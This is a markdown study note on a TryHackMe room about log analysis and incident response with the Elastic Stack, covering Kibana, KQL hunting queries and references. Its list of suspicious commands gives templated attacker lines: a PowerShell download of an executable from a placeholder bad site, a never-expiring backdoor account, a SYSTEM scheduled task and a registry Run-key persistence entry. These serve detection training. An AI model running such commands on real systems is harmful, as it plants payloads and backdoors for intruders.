
<a href="https://tryhackme.com/room/servidae" target="_blank"><img src="./banner.png" width="700px" /></a>

## Summary

This is an introductionary room that introduces the following tools that can be applied to log analysis and DFIR with the ["Elastic Stack"](https://www.elastic.co/elastic-stack), or the _ELK Stack_, which consists of:

* Elasticsearch: https://www.elastic.co/elasticsearch 
    * Described as "an open-source, distributed search and analytics engine designed for storing and indexing large volumes of data." (quoted from the [THM room, task #2](https://tryhackme.com/room/servidae))
* Logstash: https://www.elastic.co/logstash 
    * Described as a "tool primarily used to collect, process, and transform data from various sources and prepare it for storage in Elasticsearch or other systems." (quoted from the [THM room, task #2](https://tryhackme.com/room/servidae))
* Kibana: https://www.elastic.co/kibana
    * Described as "the interactive graphical and visual front-end powering the Elastic Stack." (quoted from the [THM room, task #2](https://tryhackme.com/room/servidae))

### Takeaways

I have not done a writeup for this room, but I can recommend one written by \([Alan 2023](https://medium.com/@josephalan17201972/servidae-log-analysis-in-elk-tryhackme-write-up-52a7902c7892)\) for anyone who wants to follow along. Some things that I found interesting are:

* Basic Notions in Kibana:
    * The __Discover__ tab is where analysts go to for basic exploration, querying and analysis of real time data.
    * The time zone that ELK assumes when doing analysis can be changed over at ``http://MACHINE_IP/app/management/kibana/settings?query=time+zone``
    * A __time filter__ is used in the __Discover__ tab to filter events within a specified time range.
    * The _ECS Field Reference_ \([Elastic, n.d.(https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html)\) is to be referenced when selecting fields and columns to analyse.
* KQL Queries are used to query ELK-stack powered databases. Some examples are:
    * Searches for MSI files: ``process.command_line: *msi*``
    * Searches for suspicious uses of the cURL command: ``process.name : "curl.exe" AND NOT process.command_line : *beacon*``
    * Searches for PHP cookies/POST data: ``*PHPSESSID*``
    * More sophisticated search for suspicious uses of the cURL command: ``process.name: "curl.exe" AND NOT process.command_line: *beacon* AND process.command_line: *[bad URL]*``
* Suspicious PowerShell commands include:
    * ``powershell -c Invoke-WebRequest -Uri "http://[bad website]/[bad file].exe" -OutFile "[bad file].exe"``
    * ``net user backdoor backdoor /add /expires:never /passwordchg:no``
    * ``schtasks /create /tn "[Bad Service Name]" /tr "[full path to bad batch file].bat" /sc minute /mo 1 /ru "System"``
    * ``reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "[bad registry run value]" /t REG_SZ /d "[full path to bad executable or script]" /f``
* Follow up resources include:
    * [Alan (2023)](https://medium.com/@josephalan17201972/servidae-log-analysis-in-elk-tryhackme-write-up-52a7902c7892)'s writeup for this room.
    * A _Computer Security Incident Handling Guide_ \([Cichonski et al. 2012](https://doi.org/10.6028/nist.sp.800-61r2)\) by the NIST discussing their standard for good and high-quality incident response.
    * The [MITRE ATT&CK Framework](https://attack.mitre.org/) to get a "peep into the mind" of an attacker.
    * [Elastic (n.d.-b)](https://www.elastic.co/elastic-stack/)'s article introducing their ELK stack.

## References

* Alan, J. (Oct. 25, 2023) _Servidae: Log Analysis in ELK TryHackMe Write-Up_. Retrieved on Mar 18, 2024 from: https://medium.com/@josephalan17201972/servidae-log-analysis-in-elk-tryhackme-write-up-52a7902c7892
* Cichonski, P., Millar, T., Grance, T., & Scarfone, K. (2012). _Computer Security Incident Handling Guide: Recommendations of the National Institute of Standards and Technology_. National Institute of Standards and Technology. https://doi.org/10.6028/nist.sp.800-61r2 
* Elastic (n.d.). _ECS Field Reference._ Retrieved on Mar. 18, 2024 from: https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html
* Elastic (n.d.-b). _Meet the search platform that helps you search, solve, and succeed._ Retrieved on Mar. 18, 2024 from: https://www.elastic.co/elastic-stack/
* MITRE ATT&CK Framework (n.d.). Retrieved on Mar. 18, 2024 from: https://attack.mitre.org/

